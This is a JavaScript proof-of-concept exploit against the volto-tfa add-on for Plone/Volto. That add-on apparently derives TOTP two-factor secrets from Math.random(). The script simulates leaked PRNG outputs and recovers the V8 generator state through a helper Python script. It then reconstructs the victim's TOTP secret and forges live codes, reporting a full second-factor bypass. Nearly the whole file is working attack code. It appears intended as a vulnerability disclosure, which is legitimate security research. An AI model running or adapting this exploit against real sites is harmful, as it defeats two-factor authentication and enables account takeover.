// WeakFactor — volto-tfa TOTP 2FA secret is generated from Math.random() (CWE-338/330).
// This PoC predicts a victim's enrolled TOTP secret from a few leaked Math.random()
// outputs of the same page, then forges valid TOTP codes -> full second-factor bypass.
const { encode } = require('hi-base32');
const crypto = require('crypto');
const { execFileSync } = require('child_process');
const fs = require('fs');

// ---- the exact secret generation from volto-tfa QRCodeWidget.jsx ----
//   const secret = encode(Math.random().toString(36)).toString().substring(0, 16);
const voltoSecret = (rnd) => encode(rnd.toString(36)).toString().substring(0, 16);

// ---- RFC 6238 TOTP over a hi-base32 secret (what the Plone server verifies) ----
function b32decode(s) {
  const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let bits = '';
  for (const c of s.toUpperCase().replace(/=+$/, '')) {
    const v = A.indexOf(c); if (v >= 0) bits += v.toString(2).padStart(5, '0');
  }
  const b = [];
  for (let i = 0; i + 8 <= bits.length; i += 8) b.push(parseInt(bits.slice(i, i + 8), 2));
  return Buffer.from(b);
}
function totp(secret, t) {
  const buf = Buffer.alloc(8);
  buf.writeBigUInt64BE(BigInt(Math.floor(t / 1000 / 30)));
  const h = crypto.createHmac('sha1', b32decode(secret)).update(buf).digest();
  const o = h[h.length - 1] & 0xf;
  return ((h.readUInt32BE(o) & 0x7fffffff) % 1_000_000).toString().padStart(6, '0');
}

// ========================= VICTIM (runs in the victim's browser) =========================
// The page draws Math.random() a few times before the 2FA widget mounts (component keys,
// element ids, etc.) — those values are observable to an attacker (rendered/sent upstream).
const LEAK = 6;
const leaked = [];
for (let i = 0; i < LEAK; i++) leaked.push(Math.random());
// The widget then enrols the TOTP secret with the very next Math.random() draw:
const victimSecret = voltoSecret(Math.random());
const when = Date.now();
const victimCode = totp(victimSecret, when);

// ========================= ATTACKER (only sees `leaked`) =========================
fs.writeFileSync('/tmp/wf_leaked.json', JSON.stringify(leaked));
// Recover the V8 PRNG state and predict the NEXT draw (the one the widget used):
const mantissas = JSON.parse(
  execFileSync('python3', ['v8_predict.py', '/tmp/wf_leaked.json', '1']).toString());
const predictedDraw = mantissas[0] * Math.pow(2, -52);        // exact IEEE-754 reconstruction
const forgedSecret = voltoSecret(predictedDraw);
const forgedCode = totp(forgedSecret, when);

// ========================= VERDICT =========================
console.log('observed leaked Math.random()  :', leaked.map((x) => +x.toFixed(6)).join(', '));
console.log('predicted secret-generating draw:', predictedDraw);
console.log('');
console.log('victim  TOTP secret :', victimSecret);
console.log('attacker TOTP secret:', forgedSecret, '  <- reconstructed from leaked RNG');
console.log('victim  TOTP code   :', victimCode);
console.log('attacker TOTP code  :', forgedCode);
console.log('');
const win = victimSecret === forgedSecret && victimCode === forgedCode;
console.log(win
  ? 'RESULT: secret + live code RECOVERED -> 2FA fully bypassed (CWE-338/330)'
  : 'RESULT: mismatch');
process.exit(win ? 0 : 1);
